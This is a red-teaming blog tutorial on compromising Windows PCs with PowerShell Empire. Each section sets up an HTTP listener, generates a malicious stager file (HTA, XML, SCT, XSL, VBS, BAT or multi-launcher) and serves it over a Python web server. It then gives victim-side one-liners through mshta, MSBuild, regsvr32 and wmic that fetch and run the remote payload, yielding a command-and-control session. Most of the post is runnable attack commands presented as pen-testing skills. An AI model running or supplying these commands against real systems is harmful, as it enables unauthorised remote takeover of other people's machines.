<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Multiple Ways to Exploiting Windows PC using PowerShell Empire</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-exploiting-windows-pc-using-powershell-empire/" rel="bookmark"><time class="entry-date published" datetime="2019-02-04T17:03:37+00:00">February 4, 2019</time><time class="updated" datetime="2025-05-15T17:35:12+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is our second post in the article series ‘PowerShell Empire’. In this article, we will cover all the exploits that lead to windows exploitation with the empire. To read our first post on empire series, which gives a basic guide to navigate your way through empire, click <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/hacking-with-empire-powershell-post-exploitation-agent/">here</a></span></strong>.<br/>
</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Exploiting through HTA</span></li>
<li><span style="color: #000000;">Exploiting through MSBuild.exe</span></li>
<li><span style="color: #000000;">Exploiting through regsvr32</span></li>
<li><span style="color: #000000;">XSL exploit</span></li>
<li><span style="color: #000000;">Exploiting through a visual basic script</span></li>
<li><span style="color: #000000;">BAT exploit</span></li>
<li><span style="color: #000000;">Multi_launcher exploit</span></li>
</ul>
<h3><span style="color: #800000;">Exploiting through HTA</span></h3>
<p><span style="color: #000000;">This attack helps us to exploit windows through .hta. When .hta file is run via mshta.exe it executes as .exe file with similar functionality which lets us hack our way through. To know more about this attack please click <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/bypass-application-whitelisting-using-mshta-exe-multiple-methods/">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">To run type </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./empire</pre>
<p><span style="color: #000000;">According to the workflow, firstly, we have to create a listener to listen to our local machine. Type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners</pre>
<p><span style="color: #000000;">After running the above command, it will say that “no listeners are currently active” but don’t worry, we are into the listener interface now.  So in this listener interface, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">Now that a listener is created, type ‘back’ to go in listener interface to create an exploit. For this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/hta
set Listener http
set OutFile /root/1.hta
execute</pre>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-ttgWf35VDIU/XFhtAtB0ajI/AAAAAAAAcjU/E8B8CyR588c5VByXF4kWAlSHwiRsTVyPwCEwYBhgL/s1600/1.png" alt="Exploiting Windows with PowerShell Empire" width="746" height="686"/></span></p>
<p><span style="color: #000000;">Running the above commands will create a .hta file to be used as malware. Start the python server using the following command, in order to share our .hta file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-CXxYCBFeWDQ/XFhtDRcCqmI/AAAAAAAAckA/P-Shf7uDI3wnAOdAHFi-r7Vrrs8mVFCewCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As the python server is up and running, type the following command in victims’ command prompt to execute our malicious file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mshta.exe http://192.168.1.107:8080/1.hta</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//2.bp.blogspot.com/-_7JOtpNoUCA/XFhtEBMoUdI/AAAAAAAAckM/-oF4Zpo3DYI-paNszlPuYe1aLCK0j669wCEwYBhgL/s1600/3.png" alt="Exploiting Windows with PowerShell Empire" width="581" height="234"/></span></p>
<p><span style="color: #000000;">The moment above command is executed you will have your session, to access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact XDGM6HLE
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-Vqbyyczf74s/XFhtEtvNemI/AAAAAAAAckQ/m-QYMX-QK_saHkNfiL2lOSXcQMFs7sWMACEwYBhgL/s1600/4.png"/></span></p>
<h3><span style="color: #800000;">Exploiting through MSBuild.exe</span></h3>
<p><span style="color: #000000;">Our next exploit is via MSBuild.exe, which will let you have a remote session of windows using an XML file. To know in details about this attack please click <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/">here</a></span>. And to use this exploit type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">This creates a listener, type ‘back’ to go in listener interface to create an exploit. For this, type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_xml
set Listener http
execute</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-bdszT-Wal5Q/XFhtE1ujg0I/AAAAAAAAckU/7DofnGuY1gYDqKKVCNHkyUmE5x_gvWVsQCEwYBhgL/s1600/5.1.png" alt="Exploiting Windows with PowerShell Empire" width="697" height="681"/></span></p>
<p><span style="color: #000000;">Now, an xml file is created in /tmp. Copy this file in victims’ PC (inside Microsoft.NET\Framework\v4.0.30319\) and run it typing combination of following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\
MSBuild.exe launcher.xml</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-QgsdsE2dbXs/XFhtE-YrBQI/AAAAAAAAckY/9N_YbDKs52oLx9exQY7Bhg5wC-qxG1V0wCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So, this way you will have your session, to access the said session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact A8H14C7L
sysinfo</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-5OoftvoYMDQ/XFhtFblAqQI/AAAAAAAAckc/qZPjPUZqCO0-IfAYQmpM5rx6BmF_jPErwCEwYBhgL/s1600/6.png" alt="Exploiting Windows with PowerShell Empire" width="828" height="411"/></span></p>
<h3><span style="color: #800000;">Exploiting through regsvr32</span></h3>
<p><span style="color: #000000;">Our next method is exploiting through regsvr32. To know in detail about this attack, do click <a style="color: #000000;" href="https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/">here</a>. As always, we have to create a listener first to listen to our local machine. Type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">Now that a listener is created, type ‘back’ to go in listener interface to create an exploit. For this, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_sct
set Listener http
execute</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="//2.bp.blogspot.com/-QYx-9v5dnH0/XFhtFdt52vI/AAAAAAAAckg/3r3lhFM3Egwe8dwB_gXQFsoVZgJYYQKYACEwYBhgL/s1600/7.png"/></strong></span></p>
<p><span style="color: #000000;">This will create a .sct file in /tmp. Share this file to victim’s PC using the python server and then run this file in a run window of victims’ PC by typing the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">regsvr32.exe /u /n /s /i:http//192.168.1.107:8080/launcher.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-cWBJcuNkDbY/XFhtF5BtFsI/AAAAAAAAckk/heG4oQFqnyc-QBst90yLV27na7LD4u49wCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Thus, you will have an active session. To access the session type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-q93_nOhr8Tc/XFhtGHXXOJI/AAAAAAAAcko/WhuQypbgUw0qYkceLFaZMYBq8oP2yaXNgCEwYBhgL/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Exploiting through XSL</span></h3>
<p><span style="color: #000000;">XSL is a language will help you format data, this also describes how web server will interact with using XML. Our next method of attack with empire is by exploiting .xsl file.  For this method lets activate our listener first by typing :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">As the listener is up and running, create your exploit :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_xsl
set Listener http
execute</pre>
<p><img loading="lazy" decoding="async" class="alignnone" style="color: #000000;" src="//2.bp.blogspot.com/-dJmRILsulvU/XFhtA-rGNbI/AAAAAAAAcjc/d9aJWQbMjpAw2izRN9jRKzjIzGisDcX6gCEwYBhgL/s1600/10.png" alt="Exploiting Windows with PowerShell Empire" width="714" height="793"/></p>
<p><span style="color: #000000;">This way .xsl file is created. Now run the python server from the folder where the .xsl file is created as shown in the image below :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-FSXxeezF3rY/XFhtA80ZBYI/AAAAAAAAcjY/a73_TBsm2espvvf_-hzgT7ZP81Z_FKhtQCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now execute the following command in the command prompt of your victim:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic process get brief /format:"http://192.168.1.107:8080/launcher.xsl"</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-W-ousyDWgig/XFhtBIMTwCI/AAAAAAAAcjg/pl1JAnLSRDkTQ6PWNckopnLR8VENoYxTQCEwYBhgL/s1600/12.png" alt="Exploiting Windows with PowerShell Empire" width="693" height="51"/></span></p>
<p><span style="color: #000000;">Running above will give a session, to access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-ksZL_anTK_I/XFhtBhV725I/AAAAAAAAcjk/BMSYkEMk2Vgd_2iGTQN0IAwNQgpPNFwCgCEwYBhgL/s1600/13.png"/></span></p>
<h3><span style="color: #800000;">Exploiting through Visual Basic script</span></h3>
<p><span style="color: #000000;">Our next method is to create a malicious VBS file and exploiting our victim through it. Like always, let’s create a listener first.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">Now, to create our malicious .vbs file type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_vbs
set Listener http
execute</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-4ymFBLP833Q/XFhtBj8DkOI/AAAAAAAAcjo/fzYLDhzcMes7M1JsPp3xsHjXYbfs-7qDwCEwYBhgL/s1600/14.png" alt="Exploiting Windows with PowerShell Empire" width="724" height="620"/></span></p>
<p><span style="color: #000000;">Next step is to start the python server by typing:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-cKWvX9eH04s/XFhtCPTltVI/AAAAAAAAcjs/YIfF1XNzd80_RthkDnpsEuiODSch2qM0gCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Once you share the .vbs file through the python server and execute it on the victim’s PC, you will have your session, and just like before, to access the session type :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-beXdVl8FJO4/XFhtCRfCv4I/AAAAAAAAcjw/j_ApfbR3rawPuKBQeVSwUTDA7HRxPoeXACEwYBhgL/s1600/16.png"/></span></p>
<h3><span style="color: #800000;">Exploiting through a bat file</span></h3>
<p><span style="color: #000000;">In this method, we will exploit through a .bat file. Like our previous exploits, this time too, let’s create a listener. For this, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute
back</pre>
<p><span style="color: #000000;">The above commands will create a listener for you. Let’s create our .bat file using the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager windows/launcher_bat
use Listener http
set OutFile /root/1.bat
execute</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//3.bp.blogspot.com/-PuBDS87gDVY/XFhtCsf9HoI/AAAAAAAAcj0/6K75-pqf8cEVXEDEpA-Hz_YvExwjQRPmQCEwYBhgL/s1600/17.png" alt="Exploiting Windows with PowerShell Empire" width="702" height="644"/></span></p>
<p><span style="color: #000000;">As shown, the above commands will create a .bat file. Start up the python server by using the following command to allow you to share your .bat file on your victim’s pc.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-DmFd3A2BrF0/XFhtC54mzQI/AAAAAAAAcj4/-dSWenZ1s3knJ4r4zQnpi6rp-JZ-pjEFACEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Once you run the .bat file, a session will activate. To access the session type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-9tiYB0qkGNA/XFhtDH3cqFI/AAAAAAAAcj8/QLcUlMGop8UYpKYfCL8ECx-FgcO0_QaxwCEwYBhgL/s1600/19.png"/></span></p>
<h3><span style="color: #800000;">Multi_launcher</span></h3>
<p><span style="color: #000000;">This is our last method of this post. You can use it on various platforms such as Windows, Linux, etc. Again, even for this method, create a listener:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">listeners
uselistener http
set Host http://192.168.1.107
execute</pre>
<p><span style="color: #000000;">Then type following commands for creating your malicious file:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager multi/launcher
set Listener http
execute</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//1.bp.blogspot.com/-GkRV66Vub-4/XFhtDnJRV9I/AAAAAAAAckE/OkZAjcW4-6oiwsJR4kH1X_EzQ0rEhUkSwCEwYBhgL/s1600/20.png" alt="Exploiting Windows with PowerShell Empire" width="892" height="911"/></span></p>
<p><span style="color: #000000;">Once you hit enter after the above commands, it will give you a code. Copy this code and paste it in the command prompt of the victim and hit enter. As soon as you hit enter, you will have activated a session. To access the session, type:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">interact &lt;session name&gt;
sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-hdKjczGkwjg/XFhtDxLpZHI/AAAAAAAAckI/XBJm5npu-ycurrUxCV7X813uo0jygnxWACEwYBhgL/s1600/21.png"/></span></p>
<h3><span style="color: #800000;">Conclusion </span></h3>
<p><span style="color: #000000;">The above were the methods that you can use to exploit windows using different vulnerabilities. Using this framework is an addition to your pen-testing skills after Metasploit. Enjoy!</span></p>
<p><span style="color: #000000;">To learn more about PowerShell. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
